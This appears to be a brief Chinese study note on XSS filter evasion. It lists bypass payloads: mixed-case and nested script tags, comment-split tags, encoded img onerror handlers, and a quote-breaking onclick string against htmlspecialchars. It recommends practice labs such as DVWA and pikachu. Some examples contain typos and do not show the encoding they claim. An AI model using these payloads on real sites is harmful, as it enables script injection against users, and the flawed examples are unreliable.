# xss过滤

## 一、介绍

程序一般会对xss进行函数的过滤，包括相关函数的替换

## 二、绕或

#### 第一部分 转换

##### 1.大小写替换

<SCrIpt>alert('xss')</sCrIPt>

##### 2、复写

<ssccrript>alert('xss')</ssccrriipptt>

<scripscript>alert('xss')</scriscriptpt>

##### 3、拼凑

<scri<script>pt>alert('xss')</scrip</script>t>

##### 4、注释干扰

<scr<!--jdjjd-->ipt>alert('xss')</scr<!--dhjfjds-->ipt>

#### 第二部分 编码

针对程序对某些字符进行过滤，可以通风编码的方式进行绕过

##### HTML编码

```
<img src=x onerror="alert('1')"/>
```

<imag src=x onerror="alert(xss)"/>

<imag src=x onerror="alert(xss)"/>

##### url编码

```
<img src=x onerror="alert('1234')"/>
```

<imag src=x onerror="alert(%27xss%27)"/>

可能可以绕过，但是解析时会出错

#### 第三部分 Htmlspecialchars()函数

参考链接[PHP htmlspecialchars() 函数](https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp)

该函数会把一些符号进行html实体化

如’‘ “” < <>

```
'onclick='alert(xss)
```

## 四、其他

xss漏洞的原理在于对代码形成闭合，可以存在在href里也可以存在在javascript里

总之，需要不断尝试测试，程序的代码过滤情况，查看源码

推荐练习 xsss-labs DVWA pikachu
